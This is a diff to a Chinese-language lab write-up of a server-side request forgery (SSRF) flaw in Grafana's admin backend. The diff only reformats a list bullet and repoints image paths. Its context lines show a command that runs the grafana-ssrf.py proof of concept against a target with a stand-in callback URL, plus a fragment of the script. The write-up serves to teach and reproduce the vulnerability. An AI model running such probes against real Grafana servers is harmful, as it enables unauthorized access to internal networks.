@@ -6,7 +6,7 @@ Grafana是一个开源的度量分析与可视化套件。在其管理后台中�
 
 参考链接：
 
-- https://github.com/RandomRobbieBF/grafana-ssrf
+* https://github.com/RandomRobbieBF/grafana-ssrf
 
 ## 漏洞环境
 
@@ -34,11 +34,11 @@ org_role = Admin
 python grafana-ssrf.py -H http://your-ip:3000 -u http://example.com/attack
 ```
 
-![image-20220705162041577](images/202207051620666.png)
+![image-20220705162041577](../.gitbook/assets/202207051620666.png)
 
 可见，反连平台已成功收到了HTTP请求：
 
-![image-20220705162221979](images/202207051622042.png)
+![image-20220705162221979](../.gitbook/assets/202207051622042.png)
 
 ## 漏洞POC
 
@@ -217,4 +217,3 @@ if files:
 				check_ssrf(sessionid,id,ghost,ssrf_url)
 			f.close()
 ```
-
